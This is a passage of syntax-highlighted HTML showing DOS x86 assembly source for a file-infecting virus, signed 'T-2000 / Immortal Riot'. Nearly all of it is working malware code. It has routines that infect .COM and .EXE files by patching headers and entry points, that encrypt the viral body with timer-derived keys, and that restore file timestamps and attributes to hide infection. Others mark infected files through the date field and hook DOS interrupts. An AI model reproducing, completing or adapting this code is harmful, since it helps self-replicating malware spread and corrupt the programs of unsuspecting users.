                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Abort_Infect</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">          </span><span class="sc1">; Avoid PE-files.</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Abort_Infect</span><span class="sc0">

</span><span class="sc5">Chk_4_Inf_Date</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Stamp</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Infect_File</span><span class="sc0">

</span><span class="sc5">Abort_Infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Close_File_Inf</span><span class="sc0">

</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Host_Bytes</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Header_Key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Header_Slider</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Crypt_Header</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Slide_Key</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_Key</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">End_Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Encrypted_Size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Encrypt_Word</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encrypt_Word</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Close_File_Inf</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_4_EXE</span><span class="sc0">             </span><span class="sc1">; We're infecting an .EXE ?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Infect_EXE</span><span class="sc0">

</span><span class="sc5">Infect_COM</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Calculate JMP-displacement.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Jump</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">; JMP opcode.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Displacement</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">   </span><span class="sc1">; Pointing to the viruscode.</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Set_Header</span><span class="sc0">

</span><span class="sc5">Infect_EXE</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Header_Size_Mem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Headersize in bytes.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">                  </span><span class="sc1">; Calculate size of image.</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; Calculate new CS:IP.</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_CS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_IP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_SS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_SP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Stack</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Div_512_Pages</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Image_512_Pages</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Image_Mod_512</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Min_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Stack</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Max_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Stack</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Set_Header</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Max_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Stack</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Set_Header</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_Header</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">File_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Stamp</span><span class="sc0">

</span><span class="sc5">Close_File_Inf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Close file.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

</span><span class="sc5">Restore_Attr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Restore original file-</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; attributes.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Attr</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Name</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

</span><span class="sc5">Exit_Infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Unhook_Int24h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">JMP_Int21h</span><span class="sc0">


</span><span class="sc5">OldInt13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">
</span><span class="sc5">Int13h</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Div_512_Pages</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; Divide in 512-byte pages.</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; No rest?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Exit_Div_512</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Else round to next 512.</span><span class="sc0">

</span><span class="sc5">Exit_Div_512</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Author</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'T-2000 / Immortal Riot'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Save_File_Stamp</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Time</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Date</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Restore_File_Stamp</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Time</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Date</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">OldInt21h</span><span class="sc0">


</span><span class="sc5">Go_BOF</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Set_Pos</span><span class="sc0">


</span><span class="sc5">Go_EOF</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
</span><span class="sc5">Set_Pos</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CWD</span><span class="sc0">

</span><span class="sc5">OldInt21h</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int21h</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc1">; DS:DX = line.</span><span class="sc0">
</span><span class="sc1">; CS:SI = table.</span><span class="sc0">
</span><span class="sc5">Scan_Line</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">Find_End_Line</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Find_End_Line</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Find_Filename</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STD</span><span class="sc0">
                </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Found_Filename</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Find_Filename</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Adjust_DI</span><span class="sc0">

</span><span class="sc5">Found_Filename</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; No path was supplied?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Offset_OK</span><span class="sc0">

</span><span class="sc5">Adjust_DI</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; Then adjust DI.</span><span class="sc0">

</span><span class="sc5">Offset_OK</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Filename_Buffer</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">CLD</span><span class="sc0">

</span><span class="sc5">Conv_Filename</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Make_Uppercase</span><span class="sc0">

                </span><span class="sc6">STOSB</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Conv_Filename</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Comp_Filename</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">SEGCS</span><span class="sc0">
                </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">CBW</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; NZ</span><span class="sc0">

                </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">Exit_Scan_Line</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc5">SEGCS</span><span class="sc0">
                </span><span class="sc6">REPE</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exit_Scan_Line</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Comp_Filename</span><span class="sc0">

</span><span class="sc5">Exit_Scan_Line</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">CLD</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">



</span><span class="sc1">; DS:SI = Header.</span><span class="sc0">
</span><span class="sc5">Crypt_Header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Header_Key</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Header_Slider</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Copy_Crypt_W</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">LODSW</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">ROR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

